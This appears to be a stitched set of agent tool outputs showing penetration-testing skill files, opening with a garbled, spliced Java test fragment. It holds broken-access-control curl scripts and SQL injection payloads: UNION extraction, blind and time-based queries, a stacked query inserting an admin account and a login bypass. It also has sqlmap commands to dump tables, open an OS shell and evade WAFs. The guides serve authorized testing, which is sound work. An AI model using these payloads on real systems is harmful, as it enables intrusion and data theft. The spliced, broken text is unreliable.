against a concurrent change\");\n   299\t        AccountStore.RegisterStatus created = Harness.registerStatus(fixture, EMAIL, NAME, Harness.PW_ONE, \"src-f\");\n   300\t        Harness.equal(created, staleExpected = row.passwordUpdatedAt();\n   303\t        char[] password = Harness.chars(Harness.PW_ONE);\n   304\t        try {\n   305\t            // The clock must move first: with a frozen clock 308\t            fixture.clock().advanceSeconds(60);\n   309\t            Harness.check(fixture.accounts().upgradePasswordHash(row.id(), password, staleExpected),\n   310\t                \"an upgrade Harness.check(fixture.hasher().verify(Harness.chars(Harness.PW_ONE), after.passwordHash()),\n   315\t                \"the credential still verifies after the upgrade\");\n   316\t            Harness.equal(after.passwordUpdatedAt(), staleExpected + 60,\n   317\t                \"the credential timestamp moved forward exactly once\");\n   318\t        } finally {\n   319\t Endpoints and Create Access Control Matrix\n\nDocument every endpoint and the expected access level for each role.\n\n```bash\n# Extract all endpoints from Burp Site Map\n# Target > Site Map > |-----------------------|-------|---------|------|-------|\n# | GET /admin/dashboard  | Allow | Deny    | Deny | Deny  |\n# | GET /api/users        | Allow | Allow   | Deny | Deny  |\n# | PUT /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -mc 200,301,302,403 -fc 404 \\\n  -H \"Authorization: Bearer $USER_TOKEN\" \\\n  -o endpoints.json -of json\n\n# API -H \"Authorization: Bearer $USER_TOKEN\"\n```\n\n### Step 2: Configure Automated Access Control Testing\n\nSet up Burp Authorize extension for parallel role-based testing.\n\n```\n# Install Authorize Browse the application as Admin (capture all requests)\n# 2. In Authorize tab:\n#    a. Add Regular User's session token in \"Replace cookies/headers\"\n#    b. Optionally add a second row for Unauthenticated (no auth header)\n\n# Example header replacement setup:\n# Row 1 (Low-privilege user):\n#   Cookie: session=low_priv_user_session\n#   Authorization: requests from Repeater\"\n\n# Authorize shows results as:\n# Green  = Properly restricted (different response for different user)\n# Red    = POTENTIALLY VULNERABLE (same response regardless of role)\n# Orange = Uncertain (needs manual verification)\n```\n\n### Step 3: Test Vertical Privilege Escalation\n\nAttempt to access higher-privilege functionality with lower-privilege accounts.\n\n```bash\n# Collect tokens for each role\nADMIN_TOKEN=\"Bearer admin_jwt_here\"\nMANAGER_TOKEN=\"Bearer manager_jwt_here\"\nUSER_TOKEN=\"Bearer user_jwt_here\"\n\n# Test admin endpoints \"GET /admin/reports/export\"\n  \"POST /admin/backup\"\n)\n\nfor entry in \"${ADMIN_ENDPOINTS[@]}\"; do\n  method=$(echo \"$entry\" | cut -d' ' -f1)\n  endpoint=$(echo \"$entry\" | cut -d' ' -f2)\n  echo -n \"$method $endpoint (as user): \"\n  status=$(curl -s -o /dev/null -w \"%{http_code}\" \\\n    -X \"$method\" \\\n    -H \"Authorization: $USER_TOKEN\" \\\n    -H \"Content-Type: application/json\" \\\n    \"https://target.example.com$endpoint\")\n  if [ \"$status\" == \"200\" ] || [ \"$status\" == \"201\" ]; then\n    echo \"VULNERABLE ($status)\"\n  else\n    echo \"OK ($status)\"\n  fi\ndone\n\n# Test with method override headers\ncurl -s -o /dev/null -w \"%{http_code}\" \\\n  -X POST \\\n  -H \"Authorization: $USER_TOKEN\" \\\n  -H \"X-HTTP-Method-Override: DELETE\" \\\n  \"https://target.example.com/admin/users/5\"\n\n# Test with different HTTP methods\nfor method in GET POST PUT PATCH DELETE OPTIONS HEAD; do\n  echo -n \"$method /admin/users: \"\n Horizontal Privilege Escalation\n\nVerify that users cannot access resources belonging to other users at the same privilege level.\n\n```bash\n# User A (ID: 101) testing access to User B's (ID: 102) \"/api/users/102/settings\"\n  \"/api/users/102/payment-methods\"\n)\n\nfor resource in \"${RESOURCES[@]}\"; do\n  echo -n \"GET $resource: \"\n  response=$(curl -s -w \"\\n%{http_code}\" \\\n    -H \"Authorization: $USER_A_TOKEN\" \\\n    \"https://target.example.com$resource\")\n  status=$(echo \"$response\" | tail -1)\n  body_len=$(echo \"$response\" | head -n -1 | wc -c)\n  if [ \"$status\" == \"200\" ] && [ \"$body_len\" -gt 50 ]; then\n    echo \"VULNERABLE ($status, $body_len bytes)\"\n  else\n    echo \"OK ($status)\"\n  fi\ndone\n\n# Test write operations across users\ncurl -s -X PUT \\\n  -H \"Authorization: $USER_A_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"Hacked\",\"email\":\"hacked@evil.com\"}' \\\n \"https://target.example.com$endpoint\"\n  echo\ndone\n\n# Test with expired/invalid tokens\ncurl -s -o /dev/null -w \"%{http_code}\" \\\n  -H \"Authorization: Bearer invalid_token_here\" \\\n $TENANT_A_TOKEN\" \\\n  -mc 200 -t 10 -rate 20\n```\n\n## Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| **Vertical Privilege Escalation** | Lower-privilege user accessing higher-privilege functionality (user -> admin) |\n| **Horizontal Privilege Escalation** | User accessing another user's resources at the same privilege level |\n| **Function-Level Access Control** | Authorization checks on specific features/functions regardless of URL |\n| **RBAC** | Role-Based Access Control - permissions assigned to roles, roles assigned to users |\n| **ABAC** | Attribute-Based Access Control - permissions based on user/resource/environment attributes |\n| **Multi-Tenant Isolation** | Ensuring data and functionality separation between different organizations/tenants |\n| **Insecure Direct Object Reference** | Accessing objects by manipulating identifiers without authorization checks |\n| **Missing Function-Level Check** | Endpoint exists but does not verify the caller has permission to invoke it |\n\n## Tools & Systems\n\n| Tool | Purpose |\n|------|---------|\n| **Burp Suite Professional** | Request interception and role-based testing |\n| **Authorize (Burp Extension)** | Automated access control testing across sessions |\n| **AutoRepeater (Burp Extension)** | Automatically replays requests with different auth contexts |\n| **Postman** | API testing with environment switching between roles |\n| **ffuf** | Discovering hidden endpoints that may lack access controls |\n| **OWASP ZAP** | Access control testing with context-aware scanning |\n\n## Common Scenarios\n\n### Scenario 1: Admin Panel Without Auth Check\nThe `/admin/dashboard` endpoint returns the admin panel when accessed with a regular user's session token. The front-end hides the admin menu, but the back-end does not enforce role checks.\n\n### Scenario 2: API Endpoint Missing Authorization\nThe `DELETE /api/users/{id}` endpoint checks for authentication (valid token) but not authorization (admin role). Any authenticated user can delete any other user's account.\n\n### Scenario 3: Tenant Data Leakage\nA SaaS application uses `tenant_id` in API request headers. Changing the `X-Tenant-ID` header to another tenant's ID returns their data, bypassing tenant isolation.\n\n### Scenario 4: Mass Assignment Role Escalation\nThe user profile update endpoint at `PUT /api/users/{id}` accepts a `role` field in the JSON body. Submitting `\"role\":\"admin\"` alongside a profile update elevates the user to administrator.\n\n## Output Format\n\n```\n## Broken Access Control Assessment Report\n\n**Target**: target.example.com\n**Assessment Date**: 2024-01-15\n**OWASP Category**: A01:2021 - Broken Access Control\n\n### Access Control Matrix Results\n| Endpoint | Admin | Manager | User | Guest | Expected | Actual |\n|----------|-------|---------|------|-------|----------|--------|\n| GET /admin/dashboard | 200 | 200 | 200 | 302 | Admin only | FAIL |\n| DELETE /api/users/{id} | 200 | 200 | 200 | 401 | Admin only | FAIL |\n| GET /api/users/other/profile | 200 | 200 | 200 | 401 | Own only | FAIL |\n| PUT /api/users/other/settings | 200 | 200 | 200 | 401 | Own only | FAIL |\n| GET /api/org/other-tenant | 200 | 200 | 200 | 401 | Same tenant | FAIL |\n\n### Critical Findings\n1. **Vertical Escalation**: Regular users can access /admin/* endpoints\n2. **Horizontal IDOR**: Users can read/modify other users' profiles\n3. **Tenant Isolation**: Cross-tenant data access via header manipulation\n4. **Mass Assignment**: Role escalation via profile update endpoint\n\n### Impact\n- Complete administrative access for any authenticated user\n- Full user data access across all accounts (15,000+ users)\n- Cross-tenant data breach affecting 200+ organizations\n- Account takeover via profile modification\n\n### Recommendation\n1. Implement server-side authorization checks on every endpoint\n2. Use a centralized authorization middleware/framework\n3. Enforce object-level authorization (verify ownership before access)\n4. Validate tenant context server-side, never from client headers\n5. Use allowlists for mass assignment (only permit expected fields)\n6. Implement audit logging for all access control decisions\n```\n/root/.codex/skills/testing-for-broken-access-control/references/api-reference.md\n","exit_code":0,"status":"completed"}}

| Purpose |\n|---------|---------|\n| `ssl` | TLS connection inspection and cipher suite enumeration |\n| `socket` | TCP connections for TLS handshake testing |\n| `cryptography` | Certificate parsing, key strength analysis |\n| `json` | Structure audit findings |\n| `datetime` | Check certificate validity periods |\n\n## Installation\n\n```bash\npip install cryptography\n```\n\n## TLS Configuration Audit\n\n### Check TLS Version and Cipher Suite\n```python\nimport ssl\nimport socket\n\ndef check_tls_config(hostname, port=443):\n    context = ssl.create_default_context()\n    with socket.create_connection((hostname, port), timeout=10) as sock:\n        with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n            return {\n                \"hostname\": hostname,\n                \"protocol\": ssock.version(),\n                \"cipher\": ssock.cipher()[0],\n                \"cipher_bits\": ssock.cipher()[2],\n                \"compression\": ssock.compression(),\n            }\n```\n\n### Test for Weak TLS Versions\n```python\nWEAK_PROTOCOLS = {\n    ssl.PROTOCOL_TLSv1: \"TLSv1.0\",\n    ssl.PROTOCOL_TLSv1_1: \"TLSv1.1\",\n}\n\ndef test_weak_tls(hostname, port=443):\n    findings = []\n    for protocol_const, name in WEAK_PROTOCOLS.items():\n        try:\n            ctx = ssl.SSLContext(protocol_const)\n            ctx.check_hostname = False\n            ctx.verify_mode = ssl.CERT_NONE\n            with socket.create_connection((hostname, port), timeout=5) as sock:\n                with ctx.wrap_socket(sock) as ssock:\n                    findings.append({\n                        \"protocol\": name,\n                        \"supported\": True,\n                        \"severity\": \"high\",\n                        \"issue\": f\"{name} is supported — deprecated and insecure\",\n                    })\n        except (ssl.SSLError, ConnectionRefusedError, OSError):\n            findings.append({\"protocol\": name, \"supported\": False})\n    return findings\n```\n\n### Enumerate Supported Cipher Suites\n```python\nWEAK_CIPHERS = {\n    \"RC4\", \"DES\", \"3DES\", \"MD5\", \"NULL\", \"EXPORT\", \"anon\", \"CBC\",\n}\n\ndef check_cipher_suites(hostname, port=443):\n    context = ssl.create_default_context()\n    context.set_ciphers(\"ALL:COMPLEMENTOFALL\")\n    findings = []\n    try:\n        with socket.create_connection((hostname, port), timeout=10) as sock:\n            with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n                cipher_name, protocol, bits = ssock.cipher()\n                is_weak = any(w in cipher_name for w in WEAK_CIPHERS)\n                findings.append({\n                    \"cipher\": cipher_name,\n                    \"bits\": bits,\n                    \"weak\": is_weak,\n                    \"severity\": \"high\" if is_weak else \"pass\",\n                })\n    except ssl.SSLError as e:\n        findings.append({\"error\": str(e)})\n    return findings\n```\n\n## Certificate Analysis\n\n### Parse and Audit Certificate\n```python\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives.asymmetric import rsa, ec\nfrom datetime import datetime, timezone\n\ndef audit_certificate(hostname, port=443):\n    context = ssl.create_default_context()\n    with socket.create_connection((hostname, port), timeout=10) as sock:\n        with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n            der_cert = ssock.getpeercert(binary_form=True)\n\n    cert = x509.load_der_x509_certificate(der_cert)\n    pub_key = cert.public_key()\n\n    findings = []\n    # Key strength check\n    if isinstance(pub_key, rsa.RSAPublicKey):\n        key_size = pub_key.key_size\n        if key_size < 2048:\n            findings.append({\n                \"check\": \"key_size\",\n                \"severity\": \"critical\",\n                \"detail\": f\"RSA key {key_size} bits — minimum 2048 required\",\n            })\n    elif isinstance(pub_key, ec.EllipticCurvePublicKey):\n        key_size = pub_key.curve.key_size\n        if key_size < 256:\n            findings.append({\n                \"check\": \"key_size\",\n                \"severity\": \"high\",\n                \"detail\": f\"EC key {key_size} bits — minimum 256 required\",\n            })\n\n    # Signature algorithm\n    sig_algo = cert.signature_algorithm_oid._name\n    if \"sha1\" in sig_algo.lower():\n        findings.append({\n            \"check\": \"signature_algorithm\",\n            \"severity\": \"high\",\n            \"detail\": f\"SHA-1 signature ({sig_algo}) — deprecated\",\n        })\n\n    # Validity period\n    now = datetime.now(timezone.utc)\n    days_remaining = (cert.not_valid_after_utc - now).days\n    if days_remaining < 0:\n        findings.append({\"check\": \"expiry\", \"severity\": \"critical\", \"detail\": \"Certificate expired\"})\n    elif days_remaining < 30:\n        findings.append({\"check\": \"expiry\", \"severity\": \"warning\", \"detail\": f\"Expires in {days_remaining} days\"})\n\n    return {\n        \"subject\": cert.subject.rfc4514_string(),\n        \"issuer\": cert.issuer.rfc4514_string(),\n        \"not_before\": cert.not_valid_before_utc.isoformat(),\n        \"not_after\": cert.not_valid_after_utc.isoformat(),\n        \"days_remaining\": days_remaining,\n        \"serial_number\": hex(cert.serial_number),\n        \"signature_algorithm\": sig_algo,\n        \"key_type\": \"RSA\" if isinstance(pub_key, rsa.RSAPublicKey) else \"EC\",\n        \"key_size\": key_size,\n        \"findings\": findings,\n    }\n```\n\n### Check HSTS Header\n```python\nimport requests\n\ndef check_hsts(url):\n    resp = requests.get(url, timeout=10, allow_redirects=True)\n    hsts = resp.headers.get(\"Strict-Transport-Security\", \"\")\n    findings = []\n    if not hsts:\n        findings.append({\"check\": \"hsts\", \"severity\": \"medium\", \"detail\": \"HSTS header missing\"})\n    else:\n        if \"includeSubDomains\" not in hsts:\n            findings.append({\"check\": \"hsts\", \"severity\": \"low\", \"detail\": \"HSTS missing includeSubDomains\"})\n        max_age = 0\n        for part in hsts.split(\";\"):\n            if \"max-age\" in part:\n                max_age = int(part.split(\"=\")[1].strip())\n        if max_age < 31536000:\n            findings.append({\"check\": \"hsts_max_age\", \"severity\": \"low\", \"detail\": f\"max-age {max_age} < 1 year\"})\n\n    return {\"hsts_header\": hsts, \"findings\": findings}\n```\n\n## Output Format\n\n```json\n{\n  \"hostname\": \"example.com\",\n  \"tls_version\": \"TLSv1.3\",\n  \"cipher\": \"TLS_AES_256_GCM_SHA384\",\n  \"certificate\": {\n    \"subject\": \"CN=example.com\",\n    \"issuer\": \"CN=R3,O=Let's Encrypt\",\n    \"days_remaining\": 62,\n    \"key_type\": \"EC\",\n    \"key_size\": 256\n  },\n  \"weak_tls_supported\": [\"TLSv1.0\"],\n  \"hsts_enabled\": true,\n  \"findings\": [\n    {\n      \"check\": \"weak_tls\",\n      \"severity\": \"high\",\n      \"detail\": \"TLSv1.0 is supported — deprecated and insecure\"\n    }\n  ]\n}\n```\n","exit_code":0,"status":"completed"}}

The tester detects injection points through error-based, union-based,\n  blind boolean, and time-based blind techniques across all major database engines\n  (MySQL, PostgreSQL, MSSQL, Oracle) to demonstrate data extraction, authentication\n  bypass, and potential remote code execution. Activates for requests involving SQL\n  injection testing, SQLi exploitation, database security assessment, or injection\n  vulnerability verification.\n\n  '\ndomain: cybersecurity\nsubdomain: penetration-testing\ntags:\n- SQL-injection\n- sqlmap\n- database-security\n- OWASP-A03\n- injection-testing\nversion: 1.0.0\nauthor: mahipal\nlicense: Apache-2.0\nnist_csf:\n- ID.RA-01\n- ID.RA-06\n- GV.OV-02\n- DE.AE-07\nmitre_attack:\n- T1595\n- T1190\n- T1059\n- T1078\n- T1055\n---\n# Exploiting SQL Injection Vulnerabilities\n\n## When to Use\n\n- Testing web application input parameters for SQL injection vulnerabilities during an authorized penetration test\n- Validating that parameterized queries and input sanitization are properly implemented across all database interactions\n- Demonstrating the business impact of a confirmed SQL injection vulnerability by extracting sensitive data\n- Verifying that WAF rules and input validation controls effectively block SQL injection payloads\n- Testing stored procedures, dynamic SQL, and ORM bypass scenarios in enterprise applications\n\n**Do not use** against databases without written authorization, for extracting or exfiltrating actual customer data beyond what is needed for proof of concept, or against production databases where exploitation could corrupt data integrity.\n\n## Prerequisites\n\n- Written authorization specifying the target application and permissible level of exploitation (detection only vs. full exploitation)\n- Burp Suite Professional configured as an intercepting proxy to capture and modify HTTP requests\n- sqlmap installed with current version for automated detection and exploitation\n- Knowledge of the target database engine (MySQL, PostgreSQL, MSSQL, Oracle) or ability to fingerprint it\n- Test accounts at various privilege levels to test injection in authenticated contexts\n\n## Workflow\n\n### Step 1: Injection Point Discovery\n\nIdentify parameters that interact with the database:\n\n- **Map all input vectors**: Catalog every parameter in URLs (GET), request bodies (POST), HTTP headers (Cookie, Referer, User-Agent, X-Forwarded-For), and JSON/XML API payloads\n- **Error-based detection**: Inject a single quote (`'`) into each parameter and observe the response. SQL errors (e.g., \"You have an error in your SQL syntax\", \"unterminated quoted string\", \"ORA-01756\") confirm the parameter reaches the database unsanitized.\n- **Boolean-based detection**: Inject `' AND 1=1--` (true condition) and `' AND 1=2--` (false condition). If the responses differ (different content length, different data returned, different HTTP status), the parameter is injectable.\n- **Time-based detection**: Inject `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `' AND SLEEP(5)--` (MySQL), or `'; SELECT pg_sleep(5)--` (PostgreSQL). A 5-second response delay confirms injection.\n- **Out-of-band detection**: Use payloads that trigger DNS or HTTP requests to a Burp Collaborator domain to confirm injection in scenarios where responses are not directly observable.\n- **Second-order injection**: Test for injection where input is stored and later used in a different SQL query (e.g., username stored at registration, used in a query on the profile page).\n\n### Step 2: Database Fingerprinting\n\nDetermine the database engine and version to select appropriate exploitation techniques:\n\n- **Error-based fingerprinting**: Each database produces distinctive error messages. MySQL includes \"MySQL\", MSSQL mentions \"SQL Server\", PostgreSQL references \"PG\", Oracle contains \"ORA-\".\n- **Function-based fingerprinting**: Inject database-specific functions:\n  - MySQL: `' AND VERSION()--` or `' AND @@version--`\n  - MSSQL: `' AND @@version--` or `' AND DB_NAME()--`\n  - PostgreSQL: `' AND version()--`\n  - Oracle: `' AND banner FROM v$version--`\n- **String concatenation differences**: MySQL uses `CONCAT('a','b')` or `'a' 'b'`, MSSQL uses `'a'+'b'`, PostgreSQL uses `'a'||'b'`, Oracle uses `'a'||'b'`\n- **Comment syntax**: MySQL supports `#` and `-- `, MSSQL uses `-- `, PostgreSQL uses `-- `, Oracle uses `-- `\n\n### Step 3: Manual Exploitation Techniques\n\nExploit confirmed injection points using technique-appropriate methods:\n\n- **UNION-based extraction**: Determine the number of columns with `ORDER BY` incrementing (`' ORDER BY 1--`, `' ORDER BY 2--`, etc. until an error occurs). Then construct UNION SELECT to extract data:\n  ```\n  ' UNION SELECT NULL,username,password,NULL FROM users--\n  ```\n- **Error-based extraction** (MySQL): Use `EXTRACTVALUE` or `UPDATEXML` to force data into error messages:\n  ```\n  ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--\n  ```\n- **Blind boolean extraction**: Extract data one character at a time by testing character values:\n  ```\n  ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--\n  ```\n- **Time-based blind extraction**: Same character-by-character approach using time delays:\n  ```\n  ' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--\n  ```\n- **Stacked queries** (where supported): Execute additional SQL statements:\n  ```\n  '; INSERT INTO users(username,password,role) VALUES('attacker','password','admin')--\n  ```\n\n### Step 4: Automated Exploitation with sqlmap\n\nUse sqlmap for efficient exploitation of confirmed injection points:\n\n- **Basic detection**: `sqlmap -u \"https://target.com/page?id=1\" --batch --random-agent` to detect injection and identify the database\n- **Extract databases**: `sqlmap -u \"https://target.com/page?id=1\" --dbs` to list all databases\n- **Extract tables**: `sqlmap -u \"https://target.com/page?id=1\" -D <database> --tables` to list tables\n- **Extract data**: `sqlmap -u \"https://target.com/page?id=1\" -D <database> -T users --dump --threads 5` to extract table contents\n- **POST parameters**: `sqlmap -u \"https://target.com/login\" --data=\"username=test&password=test\" -p username` to test POST parameters\n- **Cookie injection**: `sqlmap -u \"https://target.com/page\" --cookie=\"session=abc123; id=1*\" --level 2` to test cookie parameters (mark injectable parameter with *)\n- **OS command execution** (if DB user has sufficient privileges): `sqlmap -u \"https://target.com/page?id=1\" --os-shell` to attempt command execution via xp_cmdshell (MSSQL) or INTO OUTFILE (MySQL)\n- **Tamper scripts**: `sqlmap -u \"https://target.com/page?id=1\" --tamper=space2comment,between` to bypass WAF filters\n\n### Step 5: Impact Demonstration and Reporting\n\nDocument the full impact of the SQL injection vulnerability:\n\n- **Data extraction evidence**: Capture screenshots or sqlmap output showing extracted database names, table schemas, and sample records (redact actual PII in the report)\n- **Authentication bypass**: Demonstrate login bypass with `admin' OR 1=1--` and document the bypassed authentication mechanism\n- **Privilege escalation**: If the database user has DBA privileges, document what additional capabilities are available (file read/write, command execution)\n- **Lateral movement potential**: Document if the database server has network access to other internal systems that could be reached through OS-level access gained via SQLi\n- **Remediation**: Provide specific code-level fixes showing the vulnerable query and the corrected parameterized version\n\n## Key Concepts\n\n| Term | Definition |\n|------|------------|\n| **SQL Injection** | A code injection technique that exploits unvalidated user input in SQL queries to manipulate database operations, extract data, or execute administrative operations |\n| **Union-Based SQLi** | Injection technique that appends a UNION SELECT statement to the original query to extract data from other tables in the same response |\n| **Blind SQL Injection** | Injection where the application does not return query results directly; the attacker infers data through boolean responses or time delays |\n| **Parameterized Query** | A prepared SQL statement where user input is passed as parameters rather than concatenated into the query string, preventing injection |\n| **Second-Order Injection** | SQL injection where the malicious payload is stored by the application and executed in a different context or SQL query at a later time |\n| **Stacked Queries** | Executing multiple SQL statements separated by semicolons in a single request, enabling INSERT, UPDATE, or DELETE operations through injection |\n| **WAF Bypass** | Techniques for evading Web Application Firewall rules that block common SQL injection patterns, using encoding, alternate syntax, or fragmentation |\n\n## Tools & Systems\n\n- **sqlmap**: Automated SQL injection detection and exploitation tool supporting 6 injection techniques across 30+ database management systems\n- **Burp Suite Professional**: HTTP proxy for intercepting, modifying, and replaying requests with SQL injection payloads across all parameter types\n- **Havij**: GUI-based SQL injection tool used for rapid automated exploitation when sqlmap is not available\n- **jSQL Injection**: Java-based SQL injection tool with GUI supporting automatic injection, database extraction, and file read/write\n\n## Common Scenarios\n\n### Scenario: SQL Injection in Healthcare Patient Portal\n\n**Context**: A healthcare organization's patient portal allows patients to view their medical records, appointments, and billing information. The application uses a PHP backend with MySQL database. The tester has a valid patient account.\n\n**Approach**:\n1. Map all parameters in the patient portal; identify that the appointment detail page uses `/appointment?id=4521`\n2. Inject a single quote into the id parameter; receive a MySQL error confirming the parameter is injectable\n3. Use `ORDER BY` to determine the query returns 7 columns\n4. Construct UNION SELECT to extract table names from information_schema, discovering tables: patients, medical_records, billing, admin_users\n5. Extract admin_users table to reveal 5 administrator accounts with MD5-hashed passwords\n6. Demonstrate that patient medical records for all patients are accessible by querying the medical_records table through the injection point\n7. Document that 15,000+ patient records containing PHI (protected health information) are accessible, constituting a HIPAA violation\n\n**Pitfalls**:\n- Running sqlmap with default settings against a production database and causing excessive load or data corruption\n- Extracting and storing actual patient data during the assessment rather than limiting proof to record counts and schema\n- Not testing for second-order injection in stored procedures called by the application\n- Failing to test all parameter types (cookies, headers, JSON body) and only testing URL parameters\n\n## Output Format\n\n```\n## Finding: SQL Injection in Appointment Detail Parameter\n\n**ID**: SQLI-001\n**Severity**: Critical (CVSS 9.8)\n**Affected URL**: GET /appointment?id=4521\n**Parameter**: id (GET parameter)\n**Database**: MySQL 8.0.32\n**Injection Type**: Error-based, UNION-based\n\n**Description**:\nThe appointment detail page concatenates the 'id' URL parameter directly into\na SQL query without parameterization or input validation. This allows an attacker\nto inject arbitrary SQL statements and extract data from any table in the database.\n\n**Proof of Concept**:\nRequest: GET /appointment?id=4521' UNION SELECT 1,username,password,4,5,6,7 FROM admin_users-- -\nResponse: Returns admin usernames and MD5 password hashes in the page content.\n\n**Data Accessible**:\n- patients table: 15,247 records (name, DOB, SSN, address, phone)\n- medical_records table: 43,891 records (diagnoses, prescriptions, lab results)\n- admin_users table: 5 accounts with MD5-hashed passwords\n- billing table: 28,563 records (insurance details, payment information)\n\n**Remediation**:\n1. Replace string concatenation with parameterized queries:\n   VULNERABLE:  $query = \"SELECT * FROM appointments WHERE id = \" . $_GET['id'];\n   SECURE:      $stmt = $pdo->prepare(\"SELECT * FROM appointments WHERE id = ?\");\n                $stmt->execute([$_GET['id']]);\n2. Implement input validation to reject non-integer values for the id parameter\n3. Apply least-privilege database permissions (read-only for the web application user)\n4. Deploy a WAF rule to detect and block SQL injection patterns as defense-in-depth\n```\n/root/.codex/skills/exploiting-sql-injection-vulnerabilities/references/api-reference.md\n","exit_code":0,"status":"completed"}}
